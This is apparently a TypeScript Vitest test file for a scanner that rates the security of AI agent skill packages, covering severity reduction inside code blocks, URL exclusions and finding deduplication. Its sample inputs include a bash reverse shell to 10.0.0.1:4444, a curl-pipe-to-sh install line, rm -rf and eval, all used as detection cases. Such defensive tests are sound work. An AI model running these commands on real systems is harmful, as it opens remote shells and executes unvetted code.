import { describe, it, expect, beforeEach } from 'vitest';
import { join } from 'node:path';
import { reduceSeverity } from '../../src/types.js';
import { isLicenseFile, isLocalhostURL } from '../../src/utils/context.js';
import { supplyChainChecks } from '../../src/checks/supply-chain.js';
import { codeSafetyChecks } from '../../src/checks/code-safety.js';
import { scanSkillDirectory, scanSkillContent } from '../../src/scanner.js';
import { parseSkillContent } from '../../src/parser.js';
import { resetIOCCache } from '../../src/ioc/index.js';

function makeSkill(body: string) {
  return parseSkillContent(`---\nname: test\ndescription: test\n---\n${body}`);
}

beforeEach(() => {
  resetIOCCache();
});

// ===== reduceSeverity unit tests =====

describe('reduceSeverity', () => {
  it('reduces CRITICAL to HIGH', () => {
    const r = reduceSeverity('CRITICAL', 'test');
    expect(r.severity).toBe('HIGH');
    expect(r.reducedFrom).toBe('CRITICAL');
    expect(r.annotation).toContain('test');
  });

  it('reduces HIGH to MEDIUM', () => {
    const r = reduceSeverity('HIGH', 'in code block');
    expect(r.severity).toBe('MEDIUM');
    expect(r.reducedFrom).toBe('HIGH');
  });

  it('reduces MEDIUM to LOW', () => {
    const r = reduceSeverity('MEDIUM', 'reason');
    expect(r.severity).toBe('LOW');
    expect(r.reducedFrom).toBe('MEDIUM');
  });

  it('LOW stays LOW (floor)', () => {
    const r = reduceSeverity('LOW', 'reason');
    expect(r.severity).toBe('LOW');
    expect(r.reducedFrom).toBe('LOW');
  });
});

// ===== isLicenseFile unit tests =====

describe('isLicenseFile', () => {
  it('recognizes LICENSE', () => {
    expect(isLicenseFile('LICENSE')).toBe(true);
  });

  it('recognizes LICENSE.md', () => {
    expect(isLicenseFile('LICENSE.md')).toBe(true);
  });

  it('recognizes COPYING', () => {
    expect(isLicenseFile('COPYING')).toBe(true);
  });

  it('recognizes nested path', () => {
    expect(isLicenseFile('some/dir/LICENSE.txt')).toBe(true);
  });

  it('does not match README.md', () => {
    expect(isLicenseFile('README.md')).toBe(false);
  });

  it('does not match README.js', () => {
    expect(isLicenseFile('README.js')).toBe(false);
  });
});

// ===== isLocalhostURL unit tests =====

describe('isLocalhostURL', () => {
  it('matches http://localhost', () => {
    expect(isLocalhostURL('http://localhost:3000/api')).toBe(true);
  });

  it('matches http://127.0.0.1', () => {
    expect(isLocalhostURL('http://127.0.0.1:8080')).toBe(true);
  });

  it('matches https://localhost', () => {
    expect(isLocalhostURL('https://localhost/path')).toBe(true);
  });

  it('does not match http://example.com', () => {
    expect(isLocalhostURL('http://example.com')).toBe(false);
  });
});

// ===== SUPPLY-001 code block reduction =====

describe('SUPPLY-001 code block reduction', () => {
  it('reduces severity when in code block', () => {
    const skill = makeSkill([
      '# MCP Setup',
      '',
      '```json',
      '{ "mcp-server": "example" }',
      '```',
    ].join('\n'));
    const results = supplyChainChecks.run(skill);
    const s001 = results.filter((r) => r.id === 'SUPPLY-001');
    expect(s001.length).toBeGreaterThan(0);
    expect(s001[0].severity).toBe('MEDIUM'); // reduced from HIGH
    expect(s001[0].reducedFrom).toBe('HIGH');
    expect(s001[0].message).toContain('[reduced: in code block]');
  });

  it('keeps HIGH when not in code block', () => {
    const skill = makeSkill('Install the mcp-server package to get started.');
    const results = supplyChainChecks.run(skill);
    const s001 = results.filter((r) => r.id === 'SUPPLY-001');
    expect(s001.length).toBeGreaterThan(0);
    expect(s001[0].severity).toBe('HIGH');
    expect(s001[0].reducedFrom).toBeUndefined();
  });
});

// ===== SUPPLY-004 license and localhost exclusion =====

describe('SUPPLY-004 exclusions', () => {
  it('excludes http:// URLs in LICENSE files', () => {
    const skill = parseSkillContent(`---\nname: test\ndescription: test\n---\n# Test`);
    skill.files.push({
      path: 'LICENSE',
      name: 'LICENSE',
      extension: '',
      sizeBytes: 100,
      isBinary: false,
      content: 'See http://www.gnu.org/licenses/ for details.',
    });
    const results = supplyChainChecks.run(skill);
    const s004 = results.filter((r) => r.id === 'SUPPLY-004');
    expect(s004.length).toBe(0);
  });

  it('excludes localhost URLs', () => {
    const skill = makeSkill('Start server at http://localhost:3000/api endpoint.');
    const results = supplyChainChecks.run(skill);
    const s004 = results.filter((r) => r.id === 'SUPPLY-004');
    expect(s004.length).toBe(0);
  });

  it('reduces severity in code block', () => {
    const skill = makeSkill([
      '```bash',
      'curl http://example.com/api',
      '```',
    ].join('\n'));
    const results = supplyChainChecks.run(skill);
    const s004 = results.filter((r) => r.id === 'SUPPLY-004');
    expect(s004.length).toBeGreaterThan(0);
    expect(s004[0].reducedFrom).toBeDefined();
    expect(s004[0].message).toContain('[reduced: in code block]');
  });
});

// ===== CODE-003/004/006 code block reduction =====

describe('Code safety code block reduction', () => {
  it('CODE-003: reduces rm -rf in code block from CRITICAL to HIGH', () => {
    const skill = makeSkill([
      '```bash',
      'rm -rf /tmp/build',
      '```',
    ].join('\n'));
    const results = codeSafetyChecks.run(skill);
    const c003 = results.filter((r) => r.id === 'CODE-003');
    expect(c003.length).toBeGreaterThan(0);
    expect(c003[0].severity).toBe('HIGH');
    expect(c003[0].reducedFrom).toBe('CRITICAL');
  });

  it('CODE-004: reduces requests.get in code block from HIGH to MEDIUM', () => {
    const skill = makeSkill([
      '```python',
      'requests.get("https://api.example.com")',
      '```',
    ].join('\n'));
    const results = codeSafetyChecks.run(skill);
    const c004 = results.filter((r) => r.id === 'CODE-004');
    expect(c004.length).toBeGreaterThan(0);
    expect(c004[0].severity).toBe('MEDIUM');
    expect(c004[0].reducedFrom).toBe('HIGH');
  });

  it('CODE-006: reduces process.env in code block from MEDIUM to LOW', () => {
    const skill = makeSkill([
      '```javascript',
      'const key = process.env.API_KEY;',
      '```',
    ].join('\n'));
    const results = codeSafetyChecks.run(skill);
    const c006 = results.filter((r) => r.id === 'CODE-006');
    expect(c006.length).toBeGreaterThan(0);
    expect(c006[0].severity).toBe('LOW');
    expect(c006[0].reducedFrom).toBe('MEDIUM');
  });


  it('CODE-014: keeps reverse shell severity in code block (no reduction)', () => {
    const skill = makeSkill([
      '```bash',
      'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
      '```',
    ].join('\n'));
    const results = codeSafetyChecks.run(skill);
    const c014 = results.filter((r) => r.id === 'CODE-014');
    expect(c014.length).toBeGreaterThan(0);
    expect(c014[0].severity).toBe('CRITICAL');
    expect(c014[0].reducedFrom).toBeUndefined();
  });

  it('CODE-015: keeps remote pipeline severity in code block (no reduction)', () => {
    const skill = makeSkill([
      '```bash',
      'curl -fsSL https://example.com/install.sh | sh',
      '```',
    ].join('\n'));
    const results = codeSafetyChecks.run(skill);
    const c015 = results.filter((r) => r.id === 'CODE-015');
    expect(c015.length).toBeGreaterThan(0);
    expect(c015[0].severity).toBe('CRITICAL');
    expect(c015[0].reducedFrom).toBeUndefined();
  });
});

// ===== SUPPLY-006 code block + documentation reduction =====

describe('SUPPLY-006 context awareness', () => {
  it('reduces severity when git clone is in code block', () => {
    const skill = makeSkill([
      '```bash',
      'git clone https://github.com/user/repo.git',
      '```',
    ].join('\n'));
    const results = supplyChainChecks.run(skill);
    const s006 = results.filter((r) => r.id === 'SUPPLY-006');
    expect(s006.length).toBeGreaterThan(0);
    expect(s006[0].severity).toBe('LOW');
    expect(s006[0].reducedFrom).toBe('MEDIUM');
    expect(s006[0].message).toContain('[reduced: in code block]');
  });

  it('skips git clone in documentation context', () => {
    const skill = makeSkill([
      '## Installation',
      '',
      'git clone https://github.com/user/repo.git',
    ].join('\n'));
    const results = supplyChainChecks.run(skill);
    const s006 = results.filter((r) => r.id === 'SUPPLY-006');
    expect(s006.length).toBe(0);
  });

  it('keeps MEDIUM when git clone is outside code block and not in docs', () => {
    const skill = makeSkill('Run git clone https://github.com/user/repo.git to fetch code.');
    const results = supplyChainChecks.run(skill);
    const s006 = results.filter((r) => r.id === 'SUPPLY-006');
    expect(s006.length).toBeGreaterThan(0);
    expect(s006[0].severity).toBe('MEDIUM');
    expect(s006[0].reducedFrom).toBeUndefined();
  });
});

// ===== Regression: CODE-001 eval never reduced =====

describe('CODE-001 regression: eval never reduced in code block', () => {
  it('eval in code block stays CRITICAL', () => {
    const skill = makeSkill([
      '```javascript',
      'eval("payload")',
      '```',
    ].join('\n'));
    const results = codeSafetyChecks.run(skill);
    const c001 = results.filter((r) => r.id === 'CODE-001');
    expect(c001.length).toBeGreaterThan(0);
    expect(c001[0].severity).toBe('CRITICAL');
    expect(c001[0].reducedFrom).toBeUndefined();
  });
});

// ===== Deduplication via scanner =====

describe('Scanner deduplication', () => {
  it('deduplicates same rule in same file to single finding with occurrences', () => {
    const body = Array.from({ length: 5 }, (_, i) =>
      `Line ${i}: references mcp-server instance`
    ).join('\n');
    const report = scanSkillContent(`---\nname: test\ndescription: test\n---\n${body}`);
    const s001 = report.results.filter((r) => r.id === 'SUPPLY-001');
    expect(s001.length).toBe(1);
    expect(s001[0].occurrences).toBe(5);
    expect(s001[0].message).toContain('5 occurrences');
  });

  it('does not deduplicate different rules', () => {
    const body = 'Install mcp-server via npx -y mcp-server-pkg';
    const report = scanSkillContent(`---\nname: test\ndescription: test\n---\n${body}`);
    const supply = report.results.filter((r) => r.id.startsWith('SUPPLY-'));
    const ids = new Set(supply.map((r) => r.id));
    expect(ids.size).toBeGreaterThanOrEqual(2);
  });
});

// ===== Integration: mcp-reference-skill fixture =====

describe('mcp-reference-skill fixture integration', () => {
  it('scores Grade B or higher (not F)', () => {
    const fixturePath = join(__dirname, '..', 'fixtures', 'mcp-reference-skill');
    const report = scanSkillDirectory(fixturePath);
    expect(report.grade).not.toBe('F');
    expect(report.grade).not.toBe('D');
    // Should be B or better thanks to reduction + dedup
    expect(['A', 'B', 'C']).toContain(report.grade);
  });

  it('has no CRITICAL findings', () => {
    const fixturePath = join(__dirname, '..', 'fixtures', 'mcp-reference-skill');
    const report = scanSkillDirectory(fixturePath);
    expect(report.summary.critical).toBe(0);
  });
});
